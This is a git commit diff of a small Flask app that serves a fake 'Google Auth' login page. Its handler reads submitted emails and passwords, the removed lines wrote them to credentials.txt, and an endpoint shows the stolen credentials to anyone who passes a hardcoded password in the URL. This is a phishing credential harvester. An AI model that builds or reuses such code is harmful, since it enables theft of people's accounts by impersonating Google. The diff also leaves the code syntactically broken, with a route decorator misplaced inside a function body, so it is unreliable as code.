99e2bec07e1839457dd5208d62254222e24d72d1
rEsX09 <robchik439@gmail.com>
2025-07-24 13:16:43 +0300

    Update server.py

--- server.py
+++ server.py
@@ -1,8 +1,11 @@
-from flask import Flask, render_template, request, redirect, url_for, abort
+from flask import Flask, render_template, request
 
 app = Flask(__name__)
 
-# Šis ir tavs login forms
+@app.route('/')
+def home():
+    return 'Ej uz <a href="/google-auth/">Google Auth</a>'
+
 @app.route('/google-auth/', methods=['GET'])
 def show_form():
     return render_template('google-auth.html')
@@ -12,13 +15,8 @@ def handle_form():
     email = request.form['email']
     password = request.form['password']
 
-    with open("credentials.txt", "a", encoding="utf-8") as file:
-        file.write(f"{email} | {password}\n")
-
-    return redirect(url_for('show_form'))
-
-# Šis endpoint rāda saglabātos datus. Aizsargāsim to ar vienkāršu paroli
-@app.route('/show-credentials/')
+    # Saglabāšana failā:
+    @app.route('/show-credentials/')
 def show_credentials():
     auth = request.args.get('auth')
     if auth != 'Robertins1':
